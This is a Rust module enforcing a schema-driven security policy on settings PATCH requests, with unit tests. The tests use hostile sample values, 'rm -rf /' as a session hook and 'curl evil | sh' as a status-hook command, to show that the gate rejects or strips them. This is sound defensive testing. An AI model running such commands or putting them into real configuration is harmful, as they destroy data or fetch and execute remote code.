//! Server-side PATCH policy, derived from the schema (#1692).
//!
//! Replaces the hand-kept `ALLOWED_*_SECTIONS`, `SESSION_BLOCKED_FIELDS`, and
//! `ELEVATION_REQUIRED_*` constants in `src/server/api`. The settings PATCH
//! handlers walk each incoming leaf and ask the schema:
//!
//! - is `section.field` a real, known field? (unknown -> 400)
//! - does it need passphrase elevation? (`requires_elevation` and not yet
//!   elevated -> 403)
//! - is the value well-formed? ([`super::validate_value`] -> 400)
//!
//! Host-execution surfaces (`local_only`: `node_path`, agent argv/command,
//! status-hook commands) are stripped from the body by [`strip_local_only`]
//! before validation, so a bundled or echoed-back patch keeps its safe leaves
//! and silently drops the local-only ones. They can never reach disk from the
//! web regardless of how the client framed the request, and the policy is the
//! same schema data the TUI and web render from, so the surfaces cannot drift.
//!
//! Sections absent from the schema (e.g. `hooks`, which runs arbitrary shell
//! commands on session start and bypasses the repo-hook trust prompt) are
//! rejected as unknown, so they remain unreachable from the API.

use serde_json::Value;

use super::{schema, validate_value, FieldDescriptor, WebWritePolicy};

/// Which endpoint a patch arrived on. The per-profile endpoint additionally
/// accepts the top-level `description` string (a profile-only field that has
/// no schema descriptor); the global endpoint rejects it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    Global,
    Profile,
}

/// Why a settings PATCH leaf was rejected. Each variant maps to an HTTP status
/// via [`PatchRejection::status_code`] and a stable `error` code via
/// [`PatchRejection::error_code`].
#[derive(Debug, Clone, PartialEq)]
pub enum PatchRejection {
    /// Top-level key is not a known settings section. 400.
    UnknownSection(String),
    /// `section.field` is not a known field. 400.
    UnknownField(String),
    /// Section value was not a JSON object (or `description` not a string). 400.
    Malformed(String),
    /// Field needs passphrase elevation the caller has not provided. 403.
    NeedsElevation { path: String, reason: String },
    /// Value failed server-authoritative validation. 400.
    Invalid { path: String, reason: String },
}

impl PatchRejection {
    /// HTTP status: unknown/malformed/invalid are client errors (400);
    /// elevation is an authorization failure (403).
    pub fn status_code(&self) -> u16 {
        match self {
            PatchRejection::NeedsElevation { .. } => 403,
            _ => 400,
        }
    }

    /// Stable machine-readable error code for the JSON body. `elevation_required`
    /// matches the shape the web client's interceptor already keys on to fire
    /// the passphrase prompt.
    pub fn error_code(&self) -> &'static str {
        match self {
            PatchRejection::NeedsElevation { .. } => "elevation_required",
            _ => "validation_failed",
        }
    }

    /// Human-readable message surfaced to the client.
    pub fn message(&self) -> String {
        match self {
            PatchRejection::UnknownSection(s) => {
                format!("Settings section '{s}' is not allowed via the web API.")
            }
            PatchRejection::UnknownField(p) => {
                format!("Settings field '{p}' is not a known setting.")
            }
            PatchRejection::Malformed(s) => {
                format!("Settings section '{s}' has a malformed value.")
            }
            PatchRejection::NeedsElevation { .. } => "Re-enter the passphrase to continue".into(),
            PatchRejection::Invalid { path, reason } => {
                format!("Field '{path}' is invalid: {reason}")
            }
        }
    }
}

/// Look up `section.field`, or `None` if the section/field pair is unknown.
fn lookup(section: &str, field: &str) -> Option<FieldDescriptor> {
    schema()
        .into_iter()
        .find(|d| d.section == section && d.field == field)
}

fn lookup_in<'a>(
    descriptors: &'a [FieldDescriptor],
    section: &str,
    field: &str,
) -> Option<&'a FieldDescriptor> {
    descriptors
        .iter()
        .find(|d| d.section == section && d.field == field)
}

/// Remove every `local_only` leaf from a PATCH body in place, before validation
/// and merge. A bundled or echoed-back patch that includes a host-execution
/// surface (`node_path`, agent argv/command, status-hook commands) keeps its
/// safe leaves and silently drops the local-only ones, so the safe edit still
/// persists. These fields can never reach disk from the web regardless of how
/// the client framed the request. Unknown fields are left for `validate_patch`
/// to reject.
pub fn strip_local_only(patch: &mut Value) {
    let Some(obj) = patch.as_object_mut() else {
        return;
    };
    for (section, value) in obj.iter_mut() {
        let Some(fields) = value.as_object_mut() else {
            continue;
        };
        fields.retain(|field, _| {
            !matches!(
                lookup(section, field).map(|d| d.web_write),
                Some(WebWritePolicy::LocalOnly { .. })
            )
        });
    }
}

/// Insert a `{section: {field: value}}` leaf into a partition map, creating the
/// section object lazily. Shared by both partitions of [`split_global_only`].
fn put_leaf(part: &mut serde_json::Map<String, Value>, section: &str, field: &str, val: &Value) {
    let slot = part
        .entry(section.to_string())
        .or_insert_with(|| Value::Object(serde_json::Map::new()));
    // Always `Some`: the line above just inserted a fresh `Object`.
    if let Some(sec) = slot.as_object_mut() {
        sec.insert(field.to_string(), val.clone());
    }
}

/// Partition a validated PATCH body into `(global_only, profile_overridable)`.
///
/// A leaf whose schema descriptor has `profile_overridable == false` (the
/// `global_only` attribute: `web.*`, `logging.*`, ...) belongs in the **global**
/// partition, because such fields can never be profile overrides: resolution
/// always takes the global value, so writing one as a per-profile override is
/// silently lost (the bug behind `web.mobile_quick_button_count` not applying).
/// Leaves with `profile_overridable == true` stay in the **profile** partition.
///
/// Top-level non-object values (the profile-only `description` string) and
/// unknown sections/fields have no field descriptor, so they are left in the
/// profile partition for the caller's write path to handle as before.
///
/// Call this after [`strip_local_only`] + [`validate_patch`], so every leaf is
/// already known and well-formed. Both returned values are JSON objects
/// (possibly empty `{}`).
pub fn split_global_only(patch: &Value, descriptors: &[FieldDescriptor]) -> (Value, Value) {
    let mut global = serde_json::Map::new();
    let mut profile = serde_json::Map::new();
    let Some(obj) = patch.as_object() else {
        // Non-object root: nothing to partition, hand it back as profile so the
        // caller's write path handles it unchanged.
        return (Value::Object(global), patch.clone());
    };
    for (section, value) in obj {
        let Some(fields) = value.as_object() else {
            profile.insert(section.clone(), value.clone());
            continue;
        };
        for (field, fval) in fields {
            let is_global_only = lookup_in(descriptors, section, field)
                .map(|d| !d.profile_overridable)
                .unwrap_or(false);
            if is_global_only {
                put_leaf(&mut global, section, field, fval);
            } else {
                put_leaf(&mut profile, section, field, fval);
            }
        }
    }
    (Value::Object(global), Value::Object(profile))
}

/// Validate every leaf of a settings PATCH body against the schema. Returns the
/// first rejection encountered, or `Ok(())` if every leaf is a known field the
/// web may write (given `elevated`) carrying a well-formed value. A `null` leaf
/// is an override-clear request and skips value validation.
///
/// Call [`strip_local_only`] first: this function does not special-case the
/// `local_only` policy (host-execution surfaces are removed before they get
/// here), it only gates unknown fields, elevation, and value validity.
pub fn validate_patch(patch: &Value, scope: Scope, elevated: bool) -> Result<(), PatchRejection> {
    validate_patch_with(&schema(), patch, scope, elevated)
}

/// [`validate_patch`] against an explicit descriptor list. The server passes
/// the runtime schema (core plus active-plugin sections) so plugin settings
/// validate through the same gate as core fields.
pub fn validate_patch_with(
    descriptors: &[FieldDescriptor],
    patch: &Value,
    scope: Scope,
    elevated: bool,
) -> Result<(), PatchRejection> {
    let Some(obj) = patch.as_object() else {
        return Err(PatchRejection::Malformed("<root>".into()));
    };
    for (section, value) in obj {
        // `description` is a profile-only top-level string with no descriptor.
        if section == "description" {
            if scope == Scope::Profile && value.is_string() {
                continue;
            }
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        if !descriptors.iter().any(|d| d.section == *section) {
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        let Some(fields) = value.as_object() else {
            return Err(PatchRejection::Malformed(section.clone()));
        };
        for (field, val) in fields {
            let path = format!("{section}.{field}");
            let Some(d) = lookup_in(descriptors, section, field) else {
                return Err(PatchRejection::UnknownField(path));
            };
            if let WebWritePolicy::RequiresElevation { reason } = &d.web_write {
                if !elevated {
                    return Err(PatchRejection::NeedsElevation {
                        path,
                        reason: reason.clone(),
                    });
                }
            }
            // A null leaf clears a profile override; nothing to validate.
            if val.is_null() {
                continue;
            }
            if let Err(e) = validate_value(&d.validation, val) {
                return Err(PatchRejection::Invalid {
                    path,
                    reason: e.reason,
                });
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn unknown_section_rejected() {
        let err = validate_patch(&json!({"nope": {"x": 1}}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(_)));
        assert_eq!(err.status_code(), 400);
    }

    #[test]
    fn hooks_section_is_not_writable() {
        // `hooks` (HooksConfig) runs arbitrary shell commands on session start
        // and bypasses the repo-hook trust prompt. It has no schema descriptor,
        // so it must be rejected as an unknown section on every endpoint. This
        // is the load-bearing invariant the old `ALLOWED_*` pins protected.
        for scope in [Scope::Global, Scope::Profile] {
            let err = validate_patch(&json!({"hooks": {"on_start": "rm -rf /"}}), scope, true)
                .unwrap_err();
            assert!(
                matches!(err, PatchRejection::UnknownSection(ref s) if s == "hooks"),
                "hooks must be rejected as unknown on {scope:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn unknown_field_rejected() {
        let err = validate_patch(&json!({"session": {"made_up": true}}), Scope::Global, true)
            .unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownField(ref p) if p == "session.made_up"));
    }

    #[test]
    fn agent_command_fields_are_stripped() {
        // The agent-command tamper surface (binary override, argv, custom
        // agents, detect-as, acp cmd) is `local_only`: stripped from the
        // body before merge so it can never reach disk from the web. Replaces
        // SESSION_BLOCKED_FIELDS.
        for field in [
            "agent_command_override",
            "agent_extra_args",
            "custom_agents",
            "agent_detect_as",
            "agent_acp_cmd",
        ] {
            let mut body = json!({"session": {field: {"claude": "x"}, "yolo_mode_default": true}});
            strip_local_only(&mut body);
            assert!(
                body["session"].get(field).is_none(),
                "session.{field} must be stripped, body: {body}"
            );
            // The safe sibling survives and the stripped body still validates.
            assert_eq!(body["session"]["yolo_mode_default"], json!(true));
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }
    }

    #[test]
    fn status_hook_commands_are_stripped() {
        // Status-hook commands run a local shell on every status change: a
        // host-execution surface stripped before merge, even though the
        // section's enabled toggle persists.
        let mut body = json!({"status_hooks": {
            "on_running": "curl evil | sh",
            "on_idle": "x",
            "on_change": "y",
            "enabled": true,
        }});
        strip_local_only(&mut body);
        for field in ["on_running", "on_idle", "on_change"] {
            assert!(
                body["status_hooks"].get(field).is_none(),
                "status_hooks.{field} must be stripped, body: {body}"
            );
        }
        assert_eq!(body["status_hooks"]["enabled"], json!(true));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
    }

    #[test]
    fn split_global_only_routes_global_only_leaves_to_global() {
        // `web.*` fields are `global_only` (profile_overridable == false): they
        // must land in the global partition so update_profile_settings writes
        // them to the global Config instead of a profile override that
        // resolution discards (the bug behind mobile_quick_button_count).
        // `session.smart_rename` is profile-overridable, so it stays in profile.
        let descriptors = schema();
        let patch = json!({
            "web": { "mobile_quick_button_count": 9, "disable_mouse_forwarding": true },
            "session": { "smart_rename": true },
        });
        let (global, profile) = split_global_only(&patch, &descriptors);

        assert_eq!(global["web"]["mobile_quick_button_count"], json!(9));
        assert_eq!(global["web"]["disable_mouse_forwarding"], json!(true));
        assert!(
            global.get("session").is_none(),
            "profile-overridable leaf must not leak into global: {global}"
        );

        assert_eq!(profile["session"]["smart_rename"], json!(true));
        assert!(
            profile.get("web").is_none(),
            "global_only leaf must not appear in profile partition: {profile}"
        );
    }

    #[test]
    fn split_global_only_empty_global_when_all_profile_overridable() {
        let descriptors = schema();
        let patch = json!({ "session": { "smart_rename": true } });
        let (global, profile) = split_global_only(&patch, &descriptors);
        assert!(global.as_object().map(|o| o.is_empty()).unwrap_or(true));
        assert_eq!(profile["session"]["smart_rename"], json!(true));
    }

    #[test]
    fn split_global_only_keeps_description_in_profile() {
        // `description` is a profile-only top-level string with no descriptor;
        // it must stay in the profile partition.
        let descriptors = schema();
        let patch = json!({
            "description": "my profile",
            "web": { "notify_on_idle": true },
        });
        let (global, profile) = split_global_only(&patch, &descriptors);
        assert_eq!(global["web"]["notify_on_idle"], json!(true));
        assert_eq!(profile["description"], json!("my profile"));
    }

    #[test]
    fn sandbox_and_worktree_require_elevation() {
        // The persisted-tamper surfaces (image, mounts, templates) demand a
        // passphrase: unelevated callers get 403 elevation_required. Replaces
        // ELEVATION_REQUIRED_SECTIONS.
        for body in [
            json!({"sandbox": {"default_image": "alpine"}}),
            json!({"worktree": {"path_template": "{repo}-{branch}"}}),
        ] {
            let err = validate_patch(&body, Scope::Profile, false).unwrap_err();
            assert!(
                matches!(err, PatchRejection::NeedsElevation { .. }),
                "{body} should need elevation, got {err:?}"
            );
            assert_eq!(err.error_code(), "elevation_required");
            // Elevated callers pass.
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }
    }

    #[test]
    fn safe_sections_need_no_elevation() {
        // Theme, sound, updates, web, logging, description and safe session
        // fields all save without a passphrase re-prompt, even unelevated (the
        // load-bearing UX of #1510).
        for body in [
            json!({"theme": {"idle_decay_minutes": 5}}),
            json!({"updates": {"update_check_mode": "notify"}}),
            json!({"web": {"notify_on_idle": true}}),
            json!({"session": {"yolo_mode_default": true, "strict_hotkeys": false}}),
            json!({"description": "my profile"}),
        ] {
            assert!(
                validate_patch(&body, Scope::Profile, false).is_ok(),
                "{body} should validate unelevated"
            );
        }
    }

    #[test]
    fn description_is_profile_only() {
        assert!(validate_patch(&json!({"description": "x"}), Scope::Profile, true).is_ok());
        let err = validate_patch(&json!({"description": "x"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(ref s) if s == "description"));
    }

    #[test]
    fn invalid_value_rejected() {
        // default_agent is NonEmptyString.
        let err = validate_patch(
            &json!({"acp": {"default_agent": "  "}}),
            Scope::Global,
            true,
        )
        .unwrap_err();
        assert!(matches!(err, PatchRejection::Invalid { .. }));
        assert_eq!(err.status_code(), 400);
    }

    #[test]
    fn null_leaf_clears_without_validation() {
        // A null clears a profile override; it must pass validation even for a
        // field whose normal validation would reject null.
        assert!(validate_patch(
            &json!({"acp": {"default_agent": null}}),
            Scope::Profile,
            true
        )
        .is_ok());
    }

    #[test]
    fn acp_is_now_web_writable_except_node_path() {
        // The single-source fix: acp settings are reachable from the web
        // (the old curated allowlist rejected the whole section). A bundled
        // patch keeps the safe knob and silently drops the local_only
        // node_path (matches the ACP_BLOCKED_FIELDS strip contract).
        let mut body = json!({"acp": {"show_tool_durations": true, "node_path": "/tmp/evil-node"}});
        strip_local_only(&mut body);
        assert!(body["acp"].get("node_path").is_none());
        assert_eq!(body["acp"]["show_tool_durations"], json!(true));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
    }

    #[test]
    fn malformed_section_value_rejected() {
        let err =
            validate_patch(&json!({"theme": "not-an-object"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::Malformed(_)));
    }
}
